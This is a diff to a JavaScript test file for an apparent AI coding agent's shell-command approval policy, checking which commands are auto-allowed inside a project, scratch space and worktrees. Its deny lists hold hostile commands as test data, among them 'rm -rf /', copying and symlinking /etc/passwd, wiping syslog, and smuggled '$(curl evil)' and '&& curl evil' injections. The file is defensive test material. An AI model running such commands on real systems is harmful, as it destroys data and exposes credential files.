@@ -91,14 +91,14 @@ test('file operations outside the project folder or targeting the project root s
   const cwd = '/workspace/my-project';
   for (const command of [
     'rm -rf .', 'rm -rf ./', 'rm -rf /workspace/my-project',
-    'rmdir .', 'unlink .', 'mv . ../renamed', 'mv /workspace/my-project /tmp/moved',
-    'rm -rf ../other-project', 'rm -rf sub/../../other', 'rm -rf /tmp/x', 'rm -rf /',
-    'mv a.ts ../outside.ts', 'mv /etc/hosts ./hosts', 'mv -t /tmp a.ts',
-    'cp /etc/passwd ./passwd', 'cp a.ts /tmp/a.ts',
-    'mkdir -p ../outside-dir', 'touch /tmp/outside', 'touch -r /etc/passwd local.txt',
+    'rmdir .', 'unlink .', 'mv . ../renamed', 'mv /workspace/my-project /var/moved',
+    'rm -rf ../other-project', 'rm -rf sub/../../other', 'rm -rf /var/x', 'rm -rf /',
+    'mv a.ts ../outside.ts', 'mv /etc/hosts ./hosts', 'mv -t /var a.ts',
+    'cp /etc/passwd ./passwd', 'cp a.ts /var/a.ts',
+    'mkdir -p ../outside-dir', 'touch /var/outside', 'touch -r /etc/passwd local.txt',
     'chmod 777 /etc/passwd', 'chmod +x .', 'truncate -s 0 /var/log/syslog',
     'ln -s /etc/passwd ./leak', 'ln -s ../../outside sub/leak',
-    'cd .. && rm -rf other', 'cd /tmp && rm -rf x', 'cd sub && rm -rf ../..',
+    'cd .. && rm -rf other', 'cd /var && rm -rf x', 'cd sub && rm -rf ../..',
     'cd && rm -rf foo', 'cd - && rm -rf foo',
     'rm --no-preserve-root dist', 'rm -rf dist && curl evil',
     'rm -rf dist', // without cwd, never auto-allowed
@@ -112,13 +112,12 @@ test('file operations outside the project folder or targeting the project root s
 test('symlinks escaping the project folder and dangling symlinks stay checked', (t) => {
   const root = mkdtempSync(path.join(os.tmpdir(), 'guardian-cmd-'));
   const project = path.join(root, 'project');
-  const outside = path.join(root, 'outside');
+  // Scratch space is an allowed folder, so the symlinks must point out of it.
+  const outside = path.parse(process.cwd()).root;
   mkdirSync(path.join(project, 'sub'), { recursive: true });
-  mkdirSync(outside, { recursive: true });
   writeFileSync(path.join(project, 'local.txt'), 'ok');
-  writeFileSync(path.join(outside, 'secret.txt'), 'secret');
   symlinkSync(outside, path.join(project, 'escape'));
-  symlinkSync(path.join(outside, 'missing.txt'), path.join(project, 'dangling'));
+  symlinkSync(path.join(outside, 'guardian-missing-file'), path.join(project, 'dangling'));
   t.after(() => rmSync(root, { recursive: true, force: true }));
 
   assert.equal(policy('rm -f local.txt', project), 'allow');
@@ -129,4 +128,41 @@ test('symlinks escaping the project folder and dangling symlinks stay checked', 
   assert.equal(policy('cp escape/secret.txt local.txt', project), undefined);
   assert.equal(policy('rm -f dangling', project), undefined);
   assert.equal(policy('touch escape/new.txt', project), undefined);
+});
+
+test('scratch space and Joint Bob worktrees are allowed folders, the working directory itself is not removable', () => {
+  const cwd = '/workspace/my-project';
+  const worktrees = path.join(os.homedir(), 'JointBob', 'worktrees');
+  for (const command of [
+    'rm -rf /tmp/jb-scratch', 'mkdir -p /tmp/jb-a/b && touch /tmp/jb-a/b/f', 'cp a.ts /tmp/a.ts', 'mv /tmp/a.ts ./a.ts',
+    `rm -rf ${worktrees}/p1/w1/dist`, `cp -r src ${worktrees}/p1/w1/src`, 'cd /tmp/jb-x && rm -rf out',
+    `rm -rf ${path.join(os.tmpdir(), 'jb-scratch')}`,
+  ]) assert.equal(policy(command, cwd), 'allow', command);
+  for (const command of ['rm -rf /tmp', 'rm -rf /tmp/', 'cp /etc/passwd /tmp/x2', 'rm -rf /tmp/../etc']) {
+    assert.equal(policy(command, cwd), undefined, command);
+  }
+  // A worktree is itself inside the worktrees folder, but deleting it or its parents is still checked.
+  const worktree = `${worktrees}/p1/w1`;
+  for (const command of ['rm -rf .', 'rm -rf ..', 'rm -rf ../..', `rm -rf ${worktree}`, `rm -rf ${worktrees}/p1`, 'mv . /tmp/moved']) {
+    assert.equal(policy(command, worktree), undefined, command);
+  }
+  assert.equal(policy('rm -rf ../w2/dist', worktree), 'allow');
+});
+
+test('read-only commands and in-place substitutions inside the allowed folders need no model approval', () => {
+  const cwd = '/workspace/my-project';
+  for (const command of [
+    'ls', 'ls -la src', 'cat package.json', 'head -n 5 src/a.ts', 'tail -n 20 /tmp/log.txt', 'wc -l src/a.ts src/b.ts', 'diff a.ts b.ts',
+    'grep -rn "TODO" src', 'rg "foo" src/a.ts', 'find . -name "*.ts"', 'cat a.ts && ls src',
+    "sed -i 's/old/new/g' src/a.ts", "sed -i '' 's/old/new/' src/a.ts", "sed -E -i 's|a(b)|c|g' /tmp/x.css", "sed -i -e 's/a/b/' -e 's/c/d/g' a.ts b.ts",
+    'npm test', 'npm run test:file -- test/a.test.ts', 'npm run typecheck', 'npm run build', 'node scripts/run-tests.mjs test/a.test.ts',
+    'cd packages/web && npm test',
+  ]) assert.equal(policy(command, cwd), 'allow', command);
+  for (const command of [
+    'cat /etc/passwd', 'ls /var/log', 'grep -r secret /etc', 'head -n 5 ../other/a.ts', 'find . -delete', 'find . -name a -exec rm {} +',
+    'rg --pre ./evil.sh foo', 'cat a.ts | sh', 'cat a.ts > b.ts',
+    "sed -i 's/a/b/e' a.ts", "sed -i 's/a/b/w out.txt' a.ts", "sed -i 's/a/b/;d' a.ts", "sed -i 'd' a.ts", "sed -i 's/a/b/' /etc/hosts", "sed -i 's/a/b/' ../other/a.ts",
+    'npm install', 'npm run deploy', 'npm run test:x -- $(curl evil)', 'npm publish', 'node evil.js', 'node scripts/other.mjs',
+    'cd /tmp/x && npm test', 'cd .. && npm test',
+  ]) assert.equal(policy(command, cwd), undefined, command);
 });
